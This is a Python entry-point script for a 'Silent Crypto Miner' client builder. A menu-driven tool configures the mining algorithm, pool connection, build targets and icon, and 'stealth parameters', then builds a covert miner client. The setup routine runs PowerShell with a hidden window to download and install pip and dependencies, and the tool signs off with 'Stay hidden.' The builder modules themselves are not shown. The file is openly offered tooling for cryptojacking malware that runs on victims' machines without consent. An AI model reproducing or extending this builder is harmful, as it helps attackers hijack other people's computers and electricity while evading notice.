# -*- coding: utf-8 -*-
"""
Silent Crypto Miner — Client Builder Entry Point
"""
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


def _setup():
    try:
        import rich
        return
    except ImportError:
        pass
    import subprocess, importlib
    _W, _H = 40, 0x08000000
    def _bar(s, t, msg):
        f = int(_W * s // t)
        sys.stdout.write(f'\r  [{"#"*f}{"."*(_W-f)}] {100*s//t:>3}%  {msg:<35}')
        sys.stdout.flush()
    sys.stdout.write('\n  Preparing environment...\n\n')
    _bar(1, 5, 'Checking package manager...')
    if subprocess.run([sys.executable, '-m', 'pip', '-V'], capture_output=True).returncode:
        _bar(2, 5, 'Installing package manager...')
        _gp = os.path.join(os.path.dirname(sys.executable), '_gp.py')
        subprocess.run(['powershell', '-NoProfile', '-Command',
                        "(New-Object Net.WebClient).DownloadFile("
                        f"'https://bootstrap.pypa.io/get-pip.py','{_gp}')"],
                       capture_output=True, creationflags=_H)
        subprocess.run([sys.executable, _gp, '-q', '--no-warn-script-location'],
                       capture_output=True)
        try:
            os.remove(_gp)
        except OSError:
            pass
    _bar(3, 5, 'Installing dependencies...')
    subprocess.run([sys.executable, '-m', 'pip', 'install',
                    'rich', 'cryptography', '-q', '--no-warn-script-location'],
                   capture_output=True)
    _bar(4, 5, 'Verifying...')
    importlib.invalidate_caches()
    try:
        import rich
        _bar(5, 5, 'Ready!')
        sys.stdout.write('\n\n')
    except ImportError:
        sys.stdout.write('\n\n  Failed to install dependencies.\n')
        sys.stdout.write('  Run: pip install rich cryptography\n')
        input('  Press Enter to exit...')
        sys.exit(1)


_setup()

from engine import check_runtime
from engine.ui import console, print_banner, show_menu_table, print_error


MENU_ITEMS = [
    "Install Dependencies",
    "Settings",
    "About",
    "Select Target Algorithm",
    "Configure Pool Connection",
    "Set Build Options (OS, Arch, Icon)",
    "Configure Stealth Parameters",
    "Build Miner Client",
    "Exit",
]


@check_runtime
def main():
    while True:
        console.clear()
        print_banner()
        show_menu_table(MENU_ITEMS)

        try:
            choice = console.input("[bold green]  Select option >[/bold green] ").strip()
        except (KeyboardInterrupt, EOFError):
            console.print("\n[dim]Shutting down...[/dim]")
            break

        if choice == "1":
            from actions.install import run_install
            run_install()
        elif choice == "2":
            from actions.settings import action_settings
            action_settings()
        elif choice == "3":
            from actions.about import show_about
            show_about()
        elif choice == "4":
            from bot_actions import action_select_algorithm
            from config import load_config
            action_select_algorithm(load_config())
        elif choice == "5":
            from bot_actions import action_configure_pool
            from config import load_config
            action_configure_pool(load_config())
        elif choice == "6":
            from bot_actions import action_build_options
            from config import load_config
            action_build_options(load_config())
        elif choice == "7":
            from bot_actions import action_stealth_config
            from config import load_config
            action_stealth_config(load_config())
        elif choice == "8":
            from bot_actions import action_build_miner
            from config import load_config
            action_build_miner(load_config())
        elif choice == "9":
            console.print("\n[bold green]  Exiting Silent Crypto Miner. Stay hidden.[/bold green]\n")
            break
        else:
            print_error("Invalid option. Please try again.")
            console.input("\n  Press Enter to continue...")


if __name__ == "__main__":
    main()
